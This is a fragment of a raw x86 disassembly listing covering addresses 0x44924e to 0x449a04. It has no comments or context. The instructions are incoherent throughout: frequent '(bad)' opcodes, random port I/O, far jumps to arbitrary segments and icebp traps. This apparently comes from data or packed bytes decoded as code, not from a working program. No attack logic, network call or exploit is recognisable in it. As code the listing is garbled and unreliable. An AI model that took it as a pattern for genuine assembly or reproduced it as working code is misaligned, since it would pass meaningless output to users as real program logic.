  44924e:	xchg   ebp,eax
  44924f:	jl     0x4492c4
  449251:	outs   dx,BYTE PTR ds:[esi]
  449252:	xor    al,0x5d
  449254:	push   es
  449255:	aad    0x7b
  449257:	cmc    
  449258:	xchg   edx,eax
  449259:	adc    al,0x89
  44925b:	repnz pop ebx
  44925d:	xor    BYTE PTR [edi-0x418709c4],0xa3
  449264:	dec    ebx
  449265:	rcr    DWORD PTR [esi+0x13],0xd3
  449269:	lea    esp,[esi-0x465b9f18]
  44926f:	pop    edi
  449270:	test   BYTE PTR [edi],0x2
  449273:	xchg   ecx,eax
  449274:	nop
  449275:	push   esi
  449276:	outs   dx,BYTE PTR ds:[esi]
  449277:	xor    BYTE PTR [ebp-0x593cc1ab],dh
  44927d:	test   ah,dh
  44927f:	pop    ebx
  449280:	mov    eax,0x471cc316
  449285:	bound  edx,QWORD PTR [esi+0x50]
  449288:	xor    ebx,DWORD PTR [esi]
  44928a:	xchg   DWORD PTR [ecx],edi
  44928c:	in     al,0xdc
  44928e:	pop    ecx
  44928f:	adc    BYTE PTR [ebp+0x57],0xfa
  449293:	push   ds
  449294:	and    DWORD PTR [ebx],0xffffffe7
  449297:	mov    WORD PTR [edi-0x7c67614c],ds
  44929d:	mov    edx,0x1f269341
  4492a2:	adc    al,0x9c
  4492a4:	inc    ebx
  4492a5:	stos   DWORD PTR es:[edi],eax
  4492a6:	mov    bl,0x8e
  4492a8:	retf   0xb19
  4492ab:	ds test DWORD PTR gs:[esi],ebp
  4492af:	lock ds push cs
  4492b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4492b3:	scas   al,BYTE PTR es:[edi]
  4492b4:	inc    ecx
  4492b5:	fdivrp st(6),st
  4492b7:	add    edx,DWORD PTR [ecx-0x7]
  4492ba:	sbb    DWORD PTR [edx+eax*1+0x20],eax
  4492be:	inc    ebx
  4492bf:	enter  0xd285,0xd9
  4492c3:	arpl   cx,sp
  4492c5:	dec    eax
  4492c6:	sbb    DWORD PTR [ebx-0x66e4ea07],esp
  4492cc:	(bad)  
  4492ce:	ss dec ebp
  4492d0:	loop   0x449257
  4492d2:	(bad)  
  4492d4:	outs   dx,DWORD PTR ds:[esi]
  4492d5:	outs   dx,DWORD PTR ds:[esi]
  4492d6:	xchg   esi,eax
  4492d7:	push   cs
  4492d8:	jno    0x449278
  4492da:	(bad)  
  4492db:	mov    ebx,0x924feead
  4492e0:	out    dx,eax
  4492e1:	ja     0x449347
  4492e3:	cld    
  4492e4:	push   edx
  4492e5:	add    eax,0xddc7c7d8
  4492ea:	aas    
  4492eb:	inc    ecx
  4492ec:	xchg   ebp,eax
  4492ed:	mov    edi,0xc4bd73ef
  4492f2:	pop    eax
  4492f3:	retf   0x70b
  4492f6:	push   ss
  4492f7:	xchg   esp,eax
  4492f8:	or     edx,0x759ea10e
  4492fe:	hlt    
  4492ff:	jle    0x449353
  449301:	push   eax
  449302:	je     0x4492d9
  449304:	mov    bh,0x74
  449306:	loopne 0x44929e
  449308:	shr    DWORD PTR [eax-0x2a],cl
  44930b:	dec    ebp
  44930c:	data16 sub al,0xc7
  44930f:	imul   ebp,eax,0xffffff80
  449312:	ins    DWORD PTR es:[edi],dx
  449313:	(bad)  
  449314:	out    0x55,eax
  449316:	or     esp,DWORD PTR [edx+esi*4]
  449319:	lea    ebx,[ebx+ebx*1]
  44931c:	jmp    0x93b1:0xbefad3bf
  449323:	fbld   TBYTE PTR [eax]
  449325:	fisttp DWORD PTR [edx]
  449327:	ja     0x449316
  449329:	outs   dx,BYTE PTR ds:[esi]
  44932a:	add    ecx,DWORD PTR [eax-0x6a]
  44932d:	mov    cl,0x3c
  44932f:	int3   
  449330:	imul   esi,DWORD PTR [ecx-0x77],0xffffffa0
  449334:	popa   
  449335:	fmul   st,st(7)
  449337:	jmp    FWORD PTR [edi-0x22abc0ed]
  44933d:	jo     0x4492e7
  44933f:	jb     0x449314
  449341:	stos   BYTE PTR es:[edi],al
  449342:	xor    ch,BYTE PTR [ebp+eax*8-0x17c7b31]
  449349:	sahf   
  44934a:	std    
  44934b:	(bad)  
  44934c:	out    dx,eax
  44934d:	in     eax,dx
  44934e:	scas   al,BYTE PTR es:[edi]
  44934f:	push   ds
  449350:	mov    eax,ds:0x121db2e3
  449355:	fld    TBYTE PTR ds:0xb299bfb8
  44935b:	mov    ebx,0x896214f6
  449360:	mov    dl,0xed
  449362:	push   ds
  449363:	jns    0x4492f8
  449365:	std    
  449366:	jp     0x449380
  449368:	jo     0x449335
  44936a:	push   esi
  44936b:	pop    esp
  44936c:	or     dl,BYTE PTR [ebx-0x37]
  44936f:	imul   esi,DWORD PTR [edx],0x626e4e96
  449375:	pushf  
  449376:	int3   
  449377:	aaa    
  449378:	mov    bh,BYTE PTR [edx-0x4]
  44937b:	fdivr  DWORD PTR [ebp+0x5e]
  44937e:	cmp    al,BYTE PTR [ebx-0x32]
  449381:	and    bh,bh
  449383:	test   al,0xee
  449385:	adc    DWORD PTR [esi],edx
  449387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449388:	pop    esi
  449389:	in     al,dx
  44938a:	adc    esp,0xe4397a2
  449390:	jg     0x4493f9
  449392:	mov    dl,0xb5
  449394:	jp     0x449350
  449396:	sub    BYTE PTR [esi],0xe
  449399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44939a:	adc    dl,BYTE PTR [ecx]
  44939c:	pop    ds
  44939d:	in     al,dx
  44939e:	hlt    
  44939f:	scas   al,BYTE PTR es:[edi]
  4493a0:	in     eax,dx
  4493a1:	fcmovbe st,st(3)
  4493a3:	add    al,0x27
  4493a5:	das    
  4493a6:	push   0x7a8c0b11
  4493ab:	scas   eax,DWORD PTR es:[edi]
  4493ac:	xchg   ebx,eax
  4493ad:	inc    ebx
  4493ae:	(bad)  
  4493af:	ficom  DWORD PTR [esi+eiz*2]
  4493b2:	adc    al,0x8e
  4493b4:	jae    0x449393
  4493b6:	xchg   ecx,eax
  4493b7:	or     eax,0xad9b8225
  4493bc:	push   esp
  4493bd:	and    eax,0xa5a050cb
  4493c2:	lods   al,BYTE PTR ds:[esi]
  4493c3:	inc    edi
  4493c4:	mov    al,ds:0xc5716834
  4493c9:	xor    edx,DWORD PTR [edx]
  4493cb:	aad    0x12
  4493cd:	inc    dh
  4493cf:	fld    DWORD PTR [esi-0x5c]
  4493d2:	nop
  4493d3:	das    
  4493d4:	data16 jbe 0x4493f6
  4493d7:	rcl    DWORD PTR [ebp-0x41f3867f],cl
  4493dd:	dec    esi
  4493de:	or     DWORD PTR [edx],edx
  4493e0:	mov    ebp,es
  4493e2:	nop
  4493e3:	test   eax,0x12a0dae0
  4493e8:	push   esi
  4493e9:	cwde   
  4493ea:	dec    ecx
  4493eb:	ins    BYTE PTR es:[edi],dx
  4493ec:	and    ebp,DWORD PTR ds:0x7a556e9b
  4493f2:	sbb    al,0x90
  4493f4:	sti    
  4493f5:	dec    ebx
  4493f6:	xchg   ebx,eax
  4493f7:	pop    edx
  4493f8:	into   
  4493f9:	jb     0x44940b
  4493fb:	cmp    BYTE PTR [ecx+esi*4],dh
  4493fe:	stos   BYTE PTR es:[edi],al
  4493ff:	mul    DWORD PTR [ecx+0x13]
  449402:	xchg   DWORD PTR cs:[esi+eax*1],edi
  449406:	mov    ebp,0x7dd4293d
  44940b:	lods   al,BYTE PTR ds:[esi]
  44940c:	mov    edi,0x1f71aee4
  449411:	adc    eax,0x53634e46
  449416:	cmp    dl,BYTE PTR [esi-0x470bcad2]
  44941c:	cwde   
  44941d:	js     0x44940b
  44941f:	jle    0x4493c8
  449421:	inc    edx
  449422:	push   0xffffffe4
  449424:	enter  0x7475,0x25
  449428:	sbb    al,0x54
  44942a:	int    0xe6
  44942c:	or     al,0xc7
  44942e:	pop    ebp
  44942f:	rcr    BYTE PTR [ebp+0x21],cl
  449432:	loopne 0x4494b2
  449434:	clc    
  449435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449436:	mov    eax,esp
  449438:	in     al,dx
  449439:	clc    
  44943a:	(bad)  
  44943b:	in     eax,0x56
  44943d:	retf   0x3ba6
  449440:	loope  0x449491
  449442:	mov    edx,0x814cca0
  449447:	int    0x87
  449449:	fadd   QWORD PTR [eax-0x2f]
  44944c:	adc    ebx,DWORD PTR [esi+0x1d]
  44944f:	inc    esp
  449450:	inc    eax
  449451:	cmc    
  449452:	push   ebx
  449453:	cdq    
  449454:	mov    edx,0x3632f542
  449459:	loope  0x4494c5
  44945b:	or     bl,BYTE PTR [edi-0x6ddeac6b]
  449461:	pop    esi
  449462:	ficom  DWORD PTR [ebx+0x1271a3f1]
  449468:	lods   al,BYTE PTR ds:[esi]
  449469:	or     BYTE PTR [edx],dh
  44946b:	rcr    BYTE PTR [ebx-0x37fe3013],0xa5
  449472:	ret    
  449473:	int3   
  449474:	nop
  449475:	retf   
  449476:	outs   dx,DWORD PTR ds:[esi]
  449477:	jl     0x449470
  449479:	inc    edi
  44947a:	js     0x4494b9
  44947c:	jmp    DWORD PTR [ebp+ebp*2+0x5114e3d6]
  449483:	mov    ebx,0x2ea2e528
  449488:	jg     0x449495
  44948a:	mov    dl,0x5e
  44948c:	xor    BYTE PTR [esp+ebp*4+0x5f63c1a9],0x9e
  449494:	ss int 0x48
  449497:	mov    ah,BYTE PTR [edi+ebx*4+0x5960edb4]
  44949e:	fs icebp 
  4494a0:	adc    ecx,DWORD PTR [ecx+0x67]
  4494a3:	add    eax,0x3e0f2b8c
  4494a8:	test   DWORD PTR [ebx],edx
  4494aa:	mov    ebp,0x20b91f80
  4494af:	push   esi
  4494b0:	mov    ah,0x84
  4494b2:	gs dec ebx
  4494b4:	jne    0x449481
  4494b6:	ret    0x9666
  4494b9:	push   ds
  4494ba:	mov    bl,ch
  4494bc:	sub    DWORD PTR [edi],esi
  4494be:	call   0xd206:0x22725246
  4494c5:	(bad)  
  4494c6:	in     al,0xf9
  4494c8:	xor    DWORD PTR [edx-0x56e7163f],0x291328d5
  4494d2:	mov    gs,ecx
  4494d4:	xchg   DWORD PTR [ebp-0x14],eax
  4494d7:	jmp    0x4494cf
  4494d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4494da:	jb     0x449557
  4494dc:	iret   
  4494dd:	scas   eax,DWORD PTR es:[edi]
  4494de:	aaa    
  4494df:	jge    0x4494f4
  4494e1:	mov    eax,0xea10d613
  4494e6:	sbb    bh,BYTE PTR [eax-0x39dcab50]
  4494ec:	mov    esp,0xc922aab0
  4494f1:	mov    ebp,0xe1af2282
  4494f6:	adc    esi,DWORD PTR [ecx+0x29c182c2]
  4494fc:	hlt    
  4494fd:	stos   DWORD PTR es:[edi],eax
  4494fe:	inc    ebp
  4494ff:	into   
  449500:	arpl   WORD PTR [edi],bp
  449502:	aas    
  449503:	jge    0x4494a4
  449505:	inc    edx
  449506:	add    bx,WORD PTR [ecx]
  449509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44950a:	cmp    eax,0x24ee9a1e
  44950f:	in     al,dx
  449510:	rcr    BYTE PTR [ecx-0x3340025a],cl
  449516:	and    al,0x47
  449518:	bound  eax,QWORD PTR [edi+0x54]
  44951b:	(bad)  
  44951c:	mov    al,0x6c
  44951e:	data16 lock jae 0x449572
  449522:	push   esp
  449523:	xchg   BYTE PTR [ecx-0x7b],dh
  449526:	es jecxz 0x4494ad
  449529:	sbb    ebx,DWORD PTR [ecx]
  44952b:	push   ss
  44952c:	pop    es
  44952d:	ins    BYTE PTR es:[edi],dx
  44952e:	rol    DWORD PTR [eax],0xf4
  449531:	int3   
  449532:	ret    
  449533:	test   DWORD PTR [ebx-0x6b],eax
  449536:	clc    
  449537:	sbb    eax,0x2458c5d9
  44953c:	(bad)  [ebp-0x33bbba62]
  449542:	sbb    eax,0x16229c3b
  449547:	and    al,bh
  449549:	inc    edi
  44954a:	not    BYTE PTR [ebx]
  44954c:	xchg   ecx,eax
  44954d:	or     dh,BYTE PTR [eax-0x3f]
  449550:	stos   DWORD PTR es:[edi],eax
  449551:	pop    ds
  449552:	adc    al,0x9d
  449554:	js     0x449576
  449556:	xchg   ecx,eax
  449557:	gs aam 0xd8
  44955a:	mov    al,0x24
  44955c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44955d:	ret    
  44955e:	cld    
  44955f:	jg     0x449599
  449561:	cmp    al,0x8b
  449563:	xlat   BYTE PTR ds:[ebx]
  449564:	xchg   edx,eax
  449565:	shl    ecx,0x53
  449568:	enter  0x849e,0x61
  44956c:	jmp    FWORD PTR [edx-0x4b]
  44956f:	dec    ebx
  449570:	push   0xc59b335e
  449575:	sar    BYTE PTR [eax+ebp*1+0x42901033],0xfe
  44957d:	or     al,0xe7
  44957f:	scas   al,BYTE PTR es:[edi]
  449580:	xor    al,0x8
  449582:	jl     0x449507
  449584:	or     ch,cl
  449586:	rcr    BYTE PTR [esi+ecx*1-0x6e9ebd21],0xda
  44958e:	mov    DWORD PTR [edi],edi
  449590:	sbb    ch,bh
  449592:	hlt    
  449593:	mov    ds:0x2d1e9319,eax
  449599:	stc    
  44959a:	jle    0x449609
  44959c:	popa   
  44959d:	js     0x449582
  44959f:	inc    ebx
  4495a0:	inc    esp
  4495a1:	aad    0xd3
  4495a3:	fst    DWORD PTR [eax+0x2e8eea28]
  4495a9:	adc    BYTE PTR [esi+0x6fca82ae],dh
  4495af:	adc    al,0x93
  4495b1:	outs   dx,DWORD PTR ds:[esi]
  4495b2:	(bad)
  4495b6:	push   esp
  4495b7:	ds adc eax,0x2e1c5a55
  4495bd:	cmp    bl,BYTE PTR ds:0xbbf8a2d2
  4495c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4495c4:	pop    edx
  4495c5:	jne    0x449584
  4495c7:	lea    ebp,[ebp-0x26a63a6]
  4495cd:	push   ss
  4495ce:	xchg   esp,eax
  4495cf:	scas   eax,DWORD PTR es:[edi]
  4495d0:	xor    ebp,DWORD PTR [esi+ecx*8-0x3f]
  4495d4:	adc    al,0x95
  4495d6:	inc    eax
  4495d7:	sub    edx,DWORD PTR [ebp+0x7a]
  4495da:	bsr    edi,DWORD PTR [edi]
  4495dd:	fisub  DWORD PTR [ecx-0x74]
  4495e0:	std    
  4495e1:	jmp    0x44960e
  4495e3:	ror    DWORD PTR [esi],1
  4495e5:	(bad)  
  4495e6:	stc    
  4495e7:	jns    0x4495ed
  4495e9:	scas   eax,DWORD PTR es:[edi]
  4495ea:	cmp    eax,0xc2e78bd9
  4495ef:	(bad)  
  4495f0:	fcom   st(4)
  4495f2:	cmp    eax,0xfa994098
  4495f7:	pop    edi
  4495f8:	loopne 0x449617
  4495fa:	mov    bl,BYTE PTR [esi-0x42c119f3]
  449600:	not    DWORD PTR [edx]
  449602:	mov    dl,0x6e
  449604:	(bad)  
  449605:	pop    ds
  449606:	in     eax,0xef
  449608:	or     eax,0x127a22fe
  44960d:	mov    ebp,DWORD PTR ds:0x80766557
  449613:	jbe    0x44959d
  449615:	idiv   BYTE PTR [edi+0x6683934f]
  44961b:	push   ebp
  44961c:	inc    ecx
  44961d:	in     eax,dx
  44961e:	not    BYTE PTR [esi+eiz*4+0x19]
  449622:	and    eax,0x1c8d9cd6
  449627:	cmp    ebp,edx
  449629:	add    esp,DWORD PTR [ecx-0x8201380]
  44962f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449630:	sub    eax,0x29be77e9
  449635:	sub    BYTE PTR ds:0xedd0c2dc,0x7f
  44963c:	or     ecx,DWORD PTR [edx]
  44963e:	pop    ss
  44963f:	lds    esi,FWORD PTR [ebx-0x37]
  449642:	ins    DWORD PTR es:[edi],dx
  449643:	rol    DWORD PTR [edi],1
  449645:	fistp  WORD PTR [edx-0x7ebef3bc]
  44964b:	sbb    ebx,eax
  44964d:	adc    edi,esi
  44964f:	lds    esp,FWORD PTR [ecx-0x4336ca52]
  449655:	pusha  
  449656:	cwde   
  449657:	iret   
  449658:	xor    ebp,ebp
  44965a:	xor    BYTE PTR [edi],al
  44965c:	jge    0x449642
  44965e:	stos   DWORD PTR es:[edi],eax
  44965f:	inc    esp
  449660:	aaa    
  449661:	mov    WORD PTR [eax],es
  449663:	fiadd  DWORD PTR [ebp+0x2a82f2ba]
  449669:	mov    eax,ds:0x34c15724
  44966e:	inc    edx
  44966f:	dec    ebp
  449670:	fmul   DWORD PTR [esi]
  449672:	sar    BYTE PTR [edx-0x3],1
  449675:	cmp    DWORD PTR [ebx],0x96b7d9d9
  44967b:	xor    bh,BYTE PTR [ecx]
  44967d:	sbb    DWORD PTR [edi+0x2d],esi
  449680:	dec    esi
  449681:	in     eax,0x39
  449683:	outs   dx,DWORD PTR ds:[esi]
  449684:	jecxz  0x449651
  449686:	iret   
  449687:	dec    edx
  449688:	mov    eax,ds:0xc2c5df9a
  44968d:	ja     0x449696
  44968f:	sub    dh,cl
  449691:	out    0xee,eax
  449693:	sbb    esi,0x881cf676
  449699:	push   0xf88d1152
  44969e:	imul   esp,DWORD PTR [edi-0x3bb710c],0xa6fbc359
  4496a8:	cwde   
  4496a9:	in     al,0x30
  4496ab:	test   BYTE PTR [edx+0x2b4d7963],0xe7
  4496b2:	mov    al,BYTE PTR [esi-0x74]
  4496b5:	dec    ebx
  4496b6:	xlat   BYTE PTR ds:[ebx]
  4496b7:	loopne 0x449704
  4496b9:	ret    
  4496ba:	test   esp,0xdf0bf8cf
  4496c0:	outs   dx,BYTE PTR ds:[esi]
  4496c1:	mov    eax,0x3a1aafcc
  4496c6:	sbb    cl,BYTE PTR [ebp-0x3]
  4496c9:	mov    dh,0xf
  4496cb:	(bad)  
  4496cc:	jnp    0x4496af
  4496ce:	call   0xe07bded4
  4496d3:	call   0x3a2515b
  4496d8:	sbb    DWORD PTR [edx],0x7f
  4496db:	mov    ecx,0xcd51009c
  4496e0:	aad    0xdc
  4496e2:	arpl   WORD PTR [edx],cx
  4496e4:	fs out 0x68,al
  4496e7:	loop   0x449720
  4496e9:	aad    0xdd
  4496eb:	popa   
  4496ec:	pop    ss
  4496ed:	jmp    0x6bb2124f
  4496f2:	test   al,0x53
  4496f4:	loop   0x4496a3
  4496f6:	(bad)  
  4496f7:	jo     0x449770
  4496f9:	mov    eax,0xc5373da9
  4496fe:	out    0x37,eax
  449700:	scas   al,BYTE PTR es:[edi]
  449701:	rol    DWORD PTR [ebx+0x59],cl
  449704:	int    0xb3
  449706:	popa   
  449707:	daa    
  449708:	sub    ebp,DWORD PTR [ecx+0x4671f7e4]
  44970e:	sbb    eax,0xb6ad9d8c
  449713:	jmp    0x725b:0xe44a9414
  44971a:	retf   0x6bc3
  44971d:	enter  0xb4ce,0x94
  449721:	push   edi
  449722:	cmp    al,BYTE PTR [eax]
  449724:	push   edx
  449725:	adc    BYTE PTR [ecx+0x67],bh
  449728:	or     eax,0x88788405
  44972d:	in     al,0xd3
  44972f:	pop    es
  449730:	lock push ds
  449732:	xor    eax,0x63db80cc
  449737:	mov    DWORD PTR [edx-0x28ac2988],eax
  44973d:	and    BYTE PTR [ebx],dh
  44973f:	stc    
  449740:	xor    BYTE PTR [ebx+eax*8-0x4a67b9b8],dl
  449747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449749:	mov    dh,0xdb
  44974b:	mov    cl,0x41
  44974d:	mov    edi,0x95d1a373
  449752:	inc    ebp
  449753:	icebp  
  449754:	out    0x8b,al
  449756:	pop    esi
  449757:	test   DWORD PTR [eax-0x3d],ecx
  44975a:	adc    BYTE PTR [ecx+0x33],0x71
  44975e:	jg     0x449734
  449760:	test   al,al
  449762:	add    al,0x95
  449765:	shr    DWORD PTR [esi+0x3b470020],0xda
  44976c:	jnp    0x449762
  44976e:	str    eax
  449771:	ins    BYTE PTR es:[edi],dx
  449772:	jl     0x44976e
  449774:	inc    ecx
  449775:	inc    ebx
  449776:	push   esp
  449777:	fadd   st(1),st
  449779:	mov    ch,0xa5
  44977b:	iret   
  44977c:	idiv   DWORD PTR [eax]
  44977e:	add    esp,eax
  449780:	pop    eax
  449781:	shl    BYTE PTR [ebp-0x218cd073],1
  449787:	fmulp  st(5),st
  449789:	mov    ds:0x81e2424b,eax
  44978e:	push   ebp
  44978f:	push   ebp
  449790:	lea    edi,[esi+0x1d]
  449793:	shr    DWORD PTR [edx+0x49f30a2a],0x2e
  44979a:	out    dx,eax
  44979b:	cmp    dh,ch
  44979d:	or     dl,BYTE PTR ds:0xdf9b6b09
  4497a3:	or     dl,BYTE PTR [esi]
  4497a5:	sbb    DWORD PTR [edi+0x4f5a3a8e],0x20b7eeed
  4497af:	out    0xd9,al
  4497b1:	aaa    
  4497b2:	mov    al,0xaf
  4497b4:	das    
  4497b5:	adc    BYTE PTR [esi],dl
  4497b7:	or     al,0xc3
  4497b9:	cmc    
  4497ba:	and    ebp,DWORD PTR [edx-0x18]
  4497bd:	dec    edi
  4497be:	into   
  4497bf:	imul   ebp,DWORD PTR [eax],0xd4840556
  4497c5:	sbb    BYTE PTR [edi],cl
  4497c7:	lods   al,BYTE PTR ds:[esi]
  4497c8:	mov    bl,BYTE PTR [ecx+0x60]
  4497cb:	ret    0x7114
  4497ce:	add    BYTE PTR [ebx-0x3b009347],dl
  4497d4:	les    esi,FWORD PTR [edi]
  4497d6:	test   al,0xd5
  4497d8:	lahf   
  4497d9:	pop    ds
  4497da:	retf   
  4497db:	xchg   DWORD PTR [edx+0x46989494],esp
  4497e1:	push   edi
  4497e2:	(bad)  
  4497e3:	push   ecx
  4497e4:	jp     0x4497ff
  4497e6:	jmp    0x44984d
  4497e8:	xor    eax,esp
  4497ea:	push   ds
  4497eb:	add    bl,BYTE PTR [ebp+0x53]
  4497ee:	call   0x9803:0x4e49c965
  4497f5:	aaa    
  4497f6:	ins    DWORD PTR es:[edi],dx
  4497f7:	lods   al,BYTE PTR ds:[esi]
  4497f8:	arpl   WORD PTR [ebx],di
  4497fa:	retf   
  4497fb:	sub    eax,eax
  4497fd:	sub    eax,0x77ecbb41
  449802:	pop    es
  449803:	mov    ch,0xbb
  449805:	out    dx,al
  449806:	push   ecx
  449807:	xor    al,0xfa
  449809:	dec    eax
  44980a:	or     edi,DWORD PTR [eax+0x5c5ef1d4]
  449810:	cmp    DWORD PTR [ebp+0x72],0x4b747de0
  449817:	mov    eax,0xb9120e7a
  44981c:	scas   al,BYTE PTR es:[edi]
  44981d:	js     0x44985f
  44981f:	sti    
  449820:	dec    ebx
  449821:	jb     0x4497ae
  449823:	xor    DWORD PTR [eax+0x2f],ebp
  449826:	scas   al,BYTE PTR es:[edi]
  449827:	or     eax,0xf882813b
  44982c:	nop
  44982d:	jp     0x4497b9
  44982f:	adc    ecx,0x29
  449832:	push   ebp
  449833:	mov    ebx,0x58bddeca
  449838:	aad    0xde
  44983a:	imul   esp,DWORD PTR [esi+0x39],0x5884c3f0
  449841:	jo     0x4497d7
  449843:	xor    dl,BYTE PTR [ebx-0x54475640]
  449849:	push   ss
  44984a:	scas   eax,DWORD PTR es:[edi]
  44984b:	retf   0x2c68
  44984e:	and    al,0x11
  449850:	icebp  
  449851:	jmp    0x549c:0x576cee92
  449858:	jae    0x4497fd
  44985a:	out    dx,eax
  44985b:	jecxz  0x449845
  44985d:	inc    esp
  44985e:	cmp    eax,0x1e9ae7a9
  449863:	dec    ebp
  449864:	pop    ebx
  449865:	push   ecx
  449866:	cmp    ebp,eax
  449868:	cmc    
  449869:	fadd   st(1),st
  44986b:	hlt    
  44986c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44986d:	lods   al,BYTE PTR ds:[esi]
  44986e:	and    eax,ebx
  449870:	imul   eax,DWORD PTR [edx+0x60],0x7cc0e019
  449877:	not    DWORD PTR [edx]
  449879:	xor    BYTE PTR [ebx+eiz*8-0x77],0x63
  44987e:	(bad)  [edx]
  449880:	xor    eax,0x95c7f334
  449885:	jl     0x4498b4
  449887:	or     eax,0x47213cd1
  44988c:	xor    esi,DWORD PTR [ecx-0x68589a10]
  449892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449893:	hlt    
  449894:	push   edi
  449895:	mov    eax,0x155f2b6d
  44989a:	mov    ebp,DWORD PTR [edx]
  44989c:	cmp    al,ah
  44989e:	loop   0x449833
  4498a0:	and    ah,ch
  4498a2:	pushf  
  4498a3:	cmp    eax,0xb92d66af
  4498a8:	sbb    eax,0xc677650a
  4498ad:	sbb    DWORD PTR [eax+0x1629212e],edi
  4498b3:	arpl   bx,bx
  4498b5:	push   ebp
  4498b6:	xchg   edx,eax
  4498b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4498b8:	and    eax,0xe9ca0b41
  4498bd:	fs push es
  4498bf:	mov    ah,0xa6
  4498c1:	lock scas eax,DWORD PTR es:[edi]
  4498c3:	lock xchg DWORD PTR [ebp-0x2959d023],ebx
  4498ca:	jge    0x4498d4
  4498cc:	jne    0x4498b5
  4498ce:	dec    eax
  4498cf:	pop    ecx
  4498d0:	jecxz  0x44991b
  4498d2:	push   esi
  4498d3:	in     eax,0xbe
  4498d5:	push   ecx
  4498d6:	fwait
  4498d7:	push   es
  4498d8:	faddp  st(0),st
  4498da:	and    DWORD PTR [ebx],eax
  4498dc:	push   esp
  4498dd:	jge    0x44991d
  4498df:	add    al,BYTE PTR [edx-0x64]
  4498e2:	out    dx,al
  4498e3:	neg    ah
  4498e5:	push   cs
  4498e6:	aam    0xd8
  4498e8:	sbb    al,0xe8
  4498ea:	pop    esi
  4498eb:	dec    ecx
  4498ec:	ret    
  4498ed:	leave  
  4498ee:	ret    
  4498ef:	mov    gs,WORD PTR [edi-0x5b223f77]
  4498f5:	mov    esi,0x2f2796ee
  4498fa:	dec    ebx
  4498fb:	and    eax,0x14d1c376
  449900:	call   0xd320a99d
  449905:	aam    0x9c
  449907:	mov    esp,0xb86d0752
  44990c:	pop    ss
  44990d:	icebp  
  44990e:	add    DWORD PTR [eax],ebx
  449910:	rcl    DWORD PTR ds:0xa1cefcea,cl
  449916:	jno    0x449908
  449918:	(bad)  
  449919:	nop
  44991a:	inc    eax
  44991b:	dec    esp
  44991c:	xor    DWORD PTR [edx],ebp
  44991e:	mov    ds:0x8d48e1bd,al
  449923:	push   ebx
  449924:	mov    edx,0x7856e898
  449929:	or     BYTE PTR [esi+0x77],al
  44992c:	fidiv  WORD PTR [ecx+0x27f7c14a]
  449932:	mov    ds:0x5c12712c,eax
  449937:	and    edx,ebp
  449939:	ret    
  44993a:	mov    cs,WORD PTR [edx]
  44993c:	sbb    eax,0x2e1d077
  449941:	aad    0xc5
  449943:	das    
  449944:	and    edi,esi
  449946:	rcr    BYTE PTR [eax-0x5b],0x94
  44994a:	pop    ss
  44994b:	int3   
  44994c:	adc    ebp,DWORD PTR [edx+0x7edb1f28]
  449952:	in     eax,0x97
  449954:	loope  0x449909
  449956:	loopne 0x44993a
  449958:	adc    BYTE PTR [ecx-0x4],0x77
  44995c:	fldcw  WORD PTR [eax+ecx*4]
  44995f:	push   esp
  449960:	ret    
  449961:	fiadd  WORD PTR [eax+0x5366117a]
  449967:	mov    esi,0x1eb381a2
  44996c:	and    BYTE PTR [ebx-0x42],cl
  44996f:	test   BYTE PTR [esi],dh
  449971:	inc    ebp
  449972:	adc    BYTE PTR [esi-0x22d6cf32],ch
  449978:	mov    esp,0x1061cc37
  44997d:	sti    
  44997e:	fs ss xor eax,0x617b5954
  449985:	dec    ebp
  449986:	and    ebp,DWORD PTR [ecx-0x7ce0c49b]
  44998c:	jns    0x4499eb
  44998e:	jns    0x4499c4
  449990:	outs   dx,BYTE PTR ds:[esi]
  449991:	inc    edx
  449992:	out    0x3a,eax
  449994:	mov    WORD PTR [eax+0x2e640308],gs
  44999a:	aam    0x2
  44999c:	xchg   esp,eax
  44999d:	jno    0x4499f8
  44999f:	or     al,0x24
  4499a1:	pop    ds
  4499a2:	mov    BYTE PTR [esi-0x76],ch
  4499a5:	dec    esi
  4499a6:	cdq    
  4499a7:	pop    eax
  4499a8:	mov    dl,0x32
  4499aa:	nop
  4499ab:	dec    ebx
  4499ac:	mov    al,0x50
  4499ae:	xchg   BYTE PTR [edx+0x7b8720b2],ch
  4499b4:	mov    ds:0x3788628a,al
  4499b9:	fstp   DWORD PTR [ebx-0x7d4eefb0]
  4499bf:	ins    DWORD PTR es:[edi],dx
  4499c0:	ja     0x449a34
  4499c2:	icebp  
  4499c3:	or     BYTE PTR [edi-0x7030bf74],0x90
  4499ca:	loop   0x4499ed
  4499cc:	mov    WORD PTR [ebx+0x47ffb332],ds
  4499d2:	dec    edi
  4499d3:	cld    
  4499d4:	cld    
  4499d5:	sub    BYTE PTR [ebp+0x1b],bl
  4499d8:	(bad)  
  4499d9:	js     0x4499a3
  4499db:	out    0xa,al
  4499dd:	nop
  4499de:	sar    al,1
  4499e0:	lods   al,BYTE PTR ds:[esi]
  4499e1:	fsubp  st(4),st
  4499e3:	push   ebp
  4499e4:	rol    eax,cl
  4499e6:	in     al,0x78
  4499e8:	xchg   DWORD PTR [ebp+0x36],edi
  4499eb:	xor    DWORD PTR [ecx+0x75e15e27],esi
  4499f1:	out    0xbe,eax
  4499f3:	push   ds
  4499f4:	scas   eax,DWORD PTR es:[edi]
  4499f5:	ja     0x449a13
  4499f7:	inc    esi
  4499f8:	data16 xor al,0x4e
  4499fb:	stos   BYTE PTR es:[edi],al
  4499fc:	or     dh,dh
  4499fe:	pop    ecx
  4499ff:	sub    BYTE PTR [ebx],bh
  449a01:	scas   al,BYTE PTR es:[edi]
  449a02:	mov    ebp,eax
  449a04:	jo     0x4499d5
